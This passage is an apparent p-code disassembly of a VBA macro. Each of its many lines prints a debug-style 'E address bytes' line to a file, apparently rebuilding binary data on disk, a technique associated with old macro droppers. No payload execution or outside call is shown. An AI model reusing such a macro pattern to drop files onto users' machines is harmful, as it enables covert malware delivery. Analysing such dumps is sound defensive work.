' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF80 9F B6 8A 9E B7 65 7B 94 6E 86 9C 8A A2 B8 7F 9A"
' 	PrintItemNL 
' Line #3003:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AF90 AE 98 B3 C7 76 91 A5 68 85 9A 77 8F AD 7B 91 B4"
' 	PrintItemNL 
' Line #3004:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFA0 85 9B BE 78 8E B1 68 7E A1 98 AE D1 8D A3 C6 84"
' 	PrintItemNL 
' Line #3005:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFB0 9B BB 83 9B B9 6E 86 A2 94 AC C8 8F A9 C1 86 A1"
' 	PrintItemNL 
' Line #3006:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFC0 B6 B3 CE E2 8E AA BB 9F BB CC A9 C1 D5 91 A8 BE"
' 	PrintItemNL 
' Line #3007:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFD0 99 B0 C6 98 AF C5 A1 B8 CE C0 D7 ED C2 D9 EF AB"
' 	PrintItemNL 
' Line #3008:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFE0 C2 D8 84 9B B1 5B 72 88 58 6F 85 6B 82 98 6C 83"
' 	PrintItemNL 
' Line #3009:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E AFF0 99 54 6B 81 62 79 8F 7A 91 A7 5A 6F 84 74 8A 9C"
' 	PrintItemNL 
' Line #3010:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B000 7E 94 A6 58 6F 7E 5F 76 85 7D 95 A1 93 AA B9 92"
' 	PrintItemNL 
' Line #3011:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B010 A9 B8 80 96 A8 89 9F B1 69 7E 93 74 89 9E 7F 95"
' 	PrintItemNL 
' Line #3012:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B020 A7 7A 91 A1 85 9C AC 7A 91 A1 83 99 AB 96 AC BE"
' 	PrintItemNL 
' Line #3013:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B030 90 A3 B2 9F B1 BC 77 89 90 4F 5D 63 CE DA DE F4"
' 	PrintItemNL 
' Line #3014:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B040 FF FF D7 DF E6 77 81 88 54 60 66 45 53 59 34 45"
' 	PrintItemNL 
' Line #3015:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B050 48 3C 50 51 55 6A 6B 41 56 54 63 72 74 63 72 74"
' 	PrintItemNL 
' Line #3016:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B060 63 70 72 6E 7D 7F 73 80 82 00 07 09 00 00 F2 F3"
' 	PrintItemNL 
' Line #3017:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B070 F1 EF F0 EE DD DE DC D1 D2 D0 C0 C2 C2 B2 B6 B7"
' 	PrintItemNL 
' Line #3018:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B080 00 05 0A 96 9F A8 99 A5 B1 7C 8C 99 6E 7C 8E 66"
' 	PrintItemNL 
' Line #3019:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B090 76 87 72 81 91 82 92 9F 7C 87 95 6F 7C 8A 6F 7C"
' 	PrintItemNL 
' Line #3020:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0A0 8C 7C 8A 9C 82 90 A2 82 90 A2 86 96 A7 87 97 A8"
' 	PrintItemNL 
' Line #3021:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0B0 94 A4 B5 B2 C2 D3 B1 C3 D4 CE E0 F1 D3 E5 F6 AC"
' 	PrintItemNL 
' Line #3022:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0C0 BE CF 93 A5 B6 A5 B7 C8 AB BF D0 98 AB BA BC CD"
' 	PrintItemNL 
' Line #3023:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0D0 DA 9C AC B8 4F 60 6D 1E 2E 3E 2B 3D 4E 68 79 8C"
' 	PrintItemNL 
' Line #3024:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0E0 88 9A B1 8B 9D B4 9D B1 CA 80 96 AF 68 80 96 89"
' 	PrintItemNL 
' Line #3025:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B0F0 A1 B7 8B A3 B9 9B B6 CA 94 AF C3 67 82 97 7E 96"
' 	PrintItemNL 
' Line #3026:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B100 B4 83 9A BA 8B A2 C2 84 9B BB 71 88 A8 9B B2 D2"
' 	PrintItemNL 
' Line #3027:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B110 98 AF CF 90 A7 C7 8B A3 C1 79 91 AD 9A B2 CE 98"
' 	PrintItemNL 
' Line #3028:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B120 B2 CA 97 B2 C7 C1 DC F0 84 A0 B1 A4 C0 D1 AD C5"
' 	PrintItemNL 
' Line #3029:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B130 D9 91 A9 BD 9F B7 CB AA C2 D6 B0 C8 DC D0 E8 FC"
' 	PrintItemNL 
' Line #3030:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B140 BA D2 E6 B0 C8 DC 76 8E A2 5E 76 8A 6A 82 96 76"
' 	PrintItemNL 
' Line #3031:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B150 8E A2 58 70 84 4D 65 79 71 89 9D 72 8A 9E 55 6A"
' 	PrintItemNL 
' Line #3032:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B160 7F 8F A5 B7 68 7E 90 56 6D 7C 6C 83 92 8C A4 B0"
' 	PrintItemNL 
' Line #3033:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B170 96 AD BC 84 9B AA 8D A3 B5 74 8A 9C 60 75 8A 86"
' 	PrintItemNL 
' Line #3034:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B180 9B B0 78 8E A0 7B 92 A2 81 98 A8 73 8A 9A 8A A0"
' 	PrintItemNL 
' Line #3035:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B190 B2 92 A9 B9 99 AC BB 94 A6 B1 5E 70 77 42 50 56"
' 	PrintItemNL 
' Line #3036:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1A0 AC B8 BC B8 C3 C7 69 74 78 43 4E 52 66 72 78 72"
' 	PrintItemNL 
' Line #3037:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1B0 80 86 72 83 86 7B 8F 90 9A AF B0 AF C4 C2 C8 D7"
' 	PrintItemNL 
' Line #3038:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1C0 D9 B2 BF C1 57 63 65 4E 5B 5D 5F 6B 6D 00 05 07"
' 	PrintItemNL 
' Line #3039:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1D0 00 00 F5 F6 F4 F2 F3 F1 DE DF DD D1 D2 D0 C2 C4"
' 	PrintItemNL 
' Line #3040:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1E0 C4 B1 B5 B6 00 00 05 95 9E A7 88 94 A0 7A 8A 97"
' 	PrintItemNL 
' Line #3041:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B1F0 78 86 98 66 76 87 5C 6B 7B 68 78 85 73 7E 8C 74"
' 	PrintItemNL 
' Line #3042:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B200 81 8F 6E 7B 8B 78 86 98 74 82 94 83 91 A3 8C 9C"
' 	PrintItemNL 
' Line #3043:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B210 AD 79 89 9A 87 97 A8 B1 C1 D2 B1 C3 D4 BB CD DE"
' 	PrintItemNL 
' Line #3044:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B220 D4 E6 F7 CE E0 F1 A8 BA CB A2 B4 C5 AD C1 D2 A8"
' 	PrintItemNL 
' Line #3045:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B230 BB CA A4 B5 C2 C3 D3 DF 8D 9E AB 29 3A 47 14 26"
' 	PrintItemNL 
' Line #3046:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B240 37 4C 5D 70 84 97 AC 85 97 AE A7 BC D2 9A AE C7"
' 	PrintItemNL 
' Line #3047:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B250 6C 83 99 8A A2 B8 93 AB C1 98 B0 C6 AA C3 D7 6B"
' 	PrintItemNL 
' Line #3048:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B260 85 9D 7E 96 B2 8D A4 C4 92 A9 C9 8C A3 C3 78 8F"
' 	PrintItemNL 
' Line #3049:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B270 AF A5 BC DC A9 C0 E0 96 AE CC 8E A6 C4 86 9E BA"
' 	PrintItemNL 
' Line #3050:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B280 A3 BC D6 96 B0 C8 B0 CB E0 C2 DD F1 83 9F B0 B6"
' 	PrintItemNL 
' Line #3051:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B290 D0 E1 B1 C9 DD 8F A7 BB 9E B6 CA AE C6 DA C6 DE"
' 	PrintItemNL 
' Line #3052:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2A0 F2 CE E6 FA B8 D0 E4 AC C4 D8 65 7D 91 5D 75 89"
' 	PrintItemNL 
' Line #3053:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2B0 75 8D A1 71 89 9D 4A 62 76 5D 75 89 85 9D B1 69"
' 	PrintItemNL 
' Line #3054:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2C0 81 95 67 7C 91 90 A6 B8 52 69 79 60 77 86 80 98"
' 	PrintItemNL 
' Line #3055:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2D0 A4 97 AF BB 8B A2 B1 7A 91 A0 9D B3 C5 5F 75 87"
' 	PrintItemNL 
' Line #3056:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2E0 6A 7F 94 8D A2 B7 74 8A 9C 77 8E 9E 79 90 9F 78"
' 	PrintItemNL 
' Line #3057:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B2F0 8F 9E 9A B1 C1 92 A6 B7 A2 B5 C4 79 8B 96 54 64"
' 	PrintItemNL 
' Line #3058:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B300 6B 45 54 57 68 74 78 77 82 86 7B 86 8A 72 7D 81"
' 	PrintItemNL 
' Line #3059:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B310 9A A6 AC 99 A7 AD 95 A4 A7 9C AE AF CE E2 E3 ED"
' 	PrintItemNL 
' Line #3060:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B320 FF FF DB E8 EA B9 C5 C7 39 45 47 36 42 44 57 63"
' 	PrintItemNL 
' Line #3061:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B330 65 00 01 03 00 00 F7 F8 F6 F2 F3 F1 DB DC DA D0"
' 	PrintItemNL 
' Line #3062:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B340 D1 CF C4 C6 C6 B3 B7 B8 00 00 04 88 91 9A 85 91"
' 	PrintItemNL 
' Line #3063:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B350 9D 7A 8A 97 7C 8A 9C 6C 7C 8D 62 71 81 6C 7C 89"
' 	PrintItemNL 
' Line #3064:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B360 75 80 8E 75 82 90 84 91 A1 8E 9C AE 7C 8A 9C 79"
' 	PrintItemNL 
' Line #3065:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B370 87 99 88 96 A8 85 93 A5 8B 9B AC 9E AE BF A4 B4"
' 	PrintItemNL 
' Line #3066:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B380 C5 B5 C5 D6 CE E0 F1 DB ED FE C8 DA EB AB BD CE"
' 	PrintItemNL 
' Line #3067:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B390 A5 B7 C8 B3 C6 D5 98 AA B5 B0 C1 CA B4 C6 D1 81"
' 	PrintItemNL 
' Line #3068:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3A0 92 9F 00 11 20 2B 3D 4E 87 9B AD 89 9C B1 A7 BC"
' 	PrintItemNL 
' Line #3069:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3B0 D2 A8 BD D3 76 8D A3 86 9D B3 95 AC C2 8E A6 BC"
' 	PrintItemNL 
' Line #3070:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3C0 B2 CA E0 87 9F B7 81 97 B3 97 AC CB 98 AD CC 95"
' 	PrintItemNL 
' Line #3071:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3D0 AA C9 81 96 B5 B0 C5 E4 BA CF EE 9A AF CE 90 A5"
' 	PrintItemNL 
' Line #3072:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3E0 C4 94 AA C6 AC C3 DD 95 AD C5 C9 E1 F7 B4 CD E1"
' 	PrintItemNL 
' Line #3073:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B3F0 91 AB BC C6 E0 F1 A3 BB CF 95 AA BF A5 BA CF AB"
' 	PrintItemNL 
' Line #3074:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B400 C0 D5 D8 ED FF CB E0 F5 BD D2 E7 92 A7 BC 55 6A"
' 	PrintItemNL 
' Line #3075:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B410 7F 67 7C 91 75 8A 9F 62 77 8C 5A 6F 84 7C 91 A6"
' 	PrintItemNL 
' Line #3076:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B420 83 98 AD 67 7C 91 87 9B AD 80 94 A6 51 65 76 78"
' 	PrintItemNL 
' Line #3077:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B430 8D 9C 92 A8 B4 9C B2 BE 88 9D AC 8E A3 B2 97 AB"
' 	PrintItemNL 
' Line #3078:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B440 BD 54 68 7A 85 98 AD 8F A2 B7 76 8A 9C 74 88 99"
' 	PrintItemNL 
' Line #3079:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B450 7D 92 A1 95 AA B9 9D B1 C2 94 A9 B8 8B 9E AB 60"
' 	PrintItemNL 
' Line #3080:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B460 73 7B 6C 7C 82 6E 7D 80 88 94 98 B6 C2 C4 97 A2"
' 	PrintItemNL 
' Line #3081:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B470 A6 6F 7A 7E 75 81 87 6B 79 7F 5F 6E 71 76 88 89"
' 	PrintItemNL 
' Line #3082:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B480 C3 D7 D8 BE D0 CF D1 DD DF BD C6 C9 44 4D 50 2F"
' 	PrintItemNL 
' Line #3083:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B490 38 3B 52 5B 5E 00 00 03 00 00 F4 F5 F3 EE EF ED"
' 	PrintItemNL 
' Line #3084:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4A0 D9 DA D8 CE CF CD C4 C6 C6 B8 BC BD 00 00 04 7B"
' 	PrintItemNL 
' Line #3085:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4B0 84 8D 8F 9B A7 78 88 95 70 7E 90 6C 7C 8D 76 85"
' 	PrintItemNL 
' Line #3086:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4C0 95 82 92 9F 7A 85 93 6F 7A 88 82 8F 9F 98 A6 B8"
' 	PrintItemNL 
' Line #3087:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4D0 91 9F B1 7C 8A 9C 89 97 A9 99 A7 B9 86 96 A7 6C"
' 	PrintItemNL 
' Line #3088:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4E0 7C 8D 97 A7 B8 B5 C5 D6 B9 CB DC C3 D5 E6 DE F0"
' 	PrintItemNL 
' Line #3089:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B4F0 FF CF E1 F2 AB BD CE A7 BA C9 AF C1 CC A7 B8 C1"
' 	PrintItemNL 
' Line #3090:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B500 AC BE C9 C1 D3 DE 5B 6E 7B 12 25 34 4D 61 72 A0"
' 	PrintItemNL 
' Line #3091:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B510 B4 C6 AB BE D3 AF C4 DA 89 9E B4 80 97 AD 95 AC"
' 	PrintItemNL 
' Line #3092:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B520 C2 88 9F B5 AE C5 DB AB C3 DB 84 9B B5 9E B4 D0"
' 	PrintItemNL 
' Line #3093:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B530 9F B5 D1 A3 B8 D7 86 9B BA A9 BE DD C1 D6 F5 A6"
' 	PrintItemNL 
' Line #3094:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B540 BC D8 92 A8 C4 9B B2 CC AA C2 DA A2 BA D0 D3 EB"
' 	PrintItemNL 
' Line #3095:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B550 FF 9D B6 CA A5 BF D0 C5 DD EF 8E A3 B8 A0 B5 CA"
' 	PrintItemNL 
' Line #3096:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B560 B1 C6 DB B1 C6 DB D8 ED FF CC E1 F6 B1 C6 DB 71"
' 	PrintItemNL 
' Line #3097:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B570 86 9B 5A 6F 84 74 89 9E 6B 80 95 5D 72 87 77 8C"
' 	PrintItemNL 
' Line #3098:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B580 A1 84 99 AE 66 7B 90 67 7C 91 99 AD BF 6E 82 93"
' 	PrintItemNL 
' Line #3099:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B590 66 7A 8B 8D A2 B1 9A B0 BC 9B B1 BD 93 A8 B7 A7"
' 	PrintItemNL 
' Line #3100:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5A0 BC CB 6B 7F 90 57 6B 7D 97 AA BF 8C A0 B2 79 8D"
' 	PrintItemNL 
' Line #3101:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5B0 9E 73 88 97 80 95 A4 A1 B7 C3 AB C0 CF A5 B8 C7"
' 	PrintItemNL 
' Line #3102:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5C0 6E 80 8B 54 65 6E 66 76 7C 4D 5C 5E 85 92 94 BB"
' 	PrintItemNL 
' Line #3103:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5D0 C7 C9 C4 CF D3 7C 87 8B 7B 87 8D 6C 78 7E 45 54"
' 	PrintItemNL 
' Line #3104:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5E0 57 69 7A 7D DE F0 F1 C9 DB DA B1 BD BF BC C5 C8"
' 	PrintItemNL 
' Line #3105:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B5F0 6C 75 78 37 40 43 4E 57 5A 00 00 03 00 00 F4 F5"
' 	PrintItemNL 
' Line #3106:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B600 F3 EF F0 EE DC DD DB CF D0 CE C1 C3 C3 B9 BD BE"
' 	PrintItemNL 
' Line #3107:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B610 00 00 04 71 7A 83 8F 9B A7 7D 8D 9A 79 87 99 7C"
' 	PrintItemNL 
' Line #3108:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B620 8C 9D 8D 9C AC 96 A6 B3 8F 9A A8 8E 99 A7 6D 7A"
' 	PrintItemNL 
' Line #3109:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B630 8A 7B 88 98 93 A0 B0 8E 9B AB 8F 9E AE 97 A6 B6"
' 	PrintItemNL 
' Line #3110:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B640 7B 8A 9A 68 77 87 92 A2 B2 AE BE CE B7 C7 D7 B8"
' 	PrintItemNL 
' Line #3111:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B650 C8 D8 D0 E3 F2 E4 F7 FF D2 E5 F4 B4 C7 D4 BA CC"
' 	PrintItemNL 
' Line #3112:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B660 D7 AD C0 C8 9C AE B9 B1 C3 CE B9 CC D9 44 57 66"
' 	PrintItemNL 
' Line #3113:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B670 1C 2E 3F 8B 9F B1 B1 C4 D9 B7 CC E1 A3 B8 CE 87"
' 	PrintItemNL 
' Line #3114:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B680 9C B2 A1 B5 CE 86 9C B5 9B B1 CA C1 D7 F0 99 AF"
' 	PrintItemNL 
' Line #3115:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B690 C8 A1 B6 D1 9B B0 CB B0 C5 E1 91 A6 C2 A2 B7 D3"
' 	PrintItemNL 
' Line #3116:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6A0 C0 D5 F1 B3 C8 E4 9A AF CB 9E B3 CE A3 B9 D2 C1"
' 	PrintItemNL 
' Line #3117:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6B0 D8 EE D1 E8 FE 8D A5 B9 BB D3 E5 B0 C8 DA 8B A0"
' 	PrintItemNL 
' Line #3118:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6C0 B5 A7 BC D1 B5 CA DF CA DF F4 CC E1 F6 CA DF F4"
' 	PrintItemNL 
' Line #3119:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6D0 8F A4 B9 6A 7F 94 71 86 9B 67 7C 91 54 69 7E 6C"
' 	PrintItemNL 
' Line #3120:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6E0 81 96 85 9A AF 72 87 9C 5C 71 86 7E 93 A8 93 A7"
' 	PrintItemNL 
' Line #3121:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B6F0 B9 65 79 8A 81 95 A6 99 AE BD 9E B4 C0 9C B2 BD"
' 	PrintItemNL 
' Line #3122:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B700 A2 B8 C4 A1 B6 C5 56 6A 7B 7E 92 A3 9B AF C1 87"
' 	PrintItemNL 
' Line #3123:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B710 9B AD 7C 90 A1 7E 93 A2 88 9D AC 9B B1 BD A7 BA"
' 	PrintItemNL 
' Line #3124:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B720 C9 86 97 A4 56 69 71 58 6A 71 5D 6E 71 3D 4C 4E"
' 	PrintItemNL 
' Line #3125:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B730 8D 9A 9C C2 CF D1 C3 CE D2 7A 85 89 81 8D 93 70"
' 	PrintItemNL 
' Line #3126:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B740 7C 82 52 61 64 6F 80 83 DE F0 F1 EC FB FD B6 C3"
' 	PrintItemNL 
' Line #3127:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B750 C5 BB C7 C9 80 8C 8E 32 3E 40 3F 4B 4D 00 01 03"
' 	PrintItemNL 
' Line #3128:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B760 00 00 F7 F8 F6 F2 F3 F1 E2 E3 E1 D1 D2 D0 BD BF"
' 	PrintItemNL 
' Line #3129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B770 BF B7 BB BC 00 00 04 6B 74 7D 7F 8B 97 7F 8F 9C"
' 	PrintItemNL 
' Line #3130:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B780 88 96 A8 83 93 A4 83 92 A2 82 92 9F 88 93 A1 9F"
' 	PrintItemNL 
' Line #3131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B790 AB B7 79 86 96 66 73 83 8A 97 A7 9A A7 B7 8B 9A"
' 	PrintItemNL 
' Line #3132:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7A0 AA 7C 8B 9B 6E 7D 8D 8B 9A AA 7B 8B 9B 94 A4 B4"
' 	PrintItemNL 
' Line #3133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7B0 BF CF DF B9 C9 D9 9D B0 BF C6 D9 E8 EA FD FF D0"
' 	PrintItemNL 
' Line #3134:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7C0 E3 F0 BB CD D8 B2 C5 CD AC BE C9 A4 B6 C1 BA CD"
' 	PrintItemNL 
' Line #3135:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7D0 DA B2 C5 D2 42 55 64 5B 6D 7E B7 CB DD BF D2 E7"
' 	PrintItemNL 
' Line #3136:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7E0 BB CE E3 91 A6 BC AD C2 D8 8A 9E B7 8A 9E B7 C3"
' 	PrintItemNL 
' Line #3137:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B7F0 D9 F2 B6 CC E5 9F B5 CE 89 9F B8 B3 C8 E3 A0 B5"
' 	PrintItemNL 
' Line #3138:
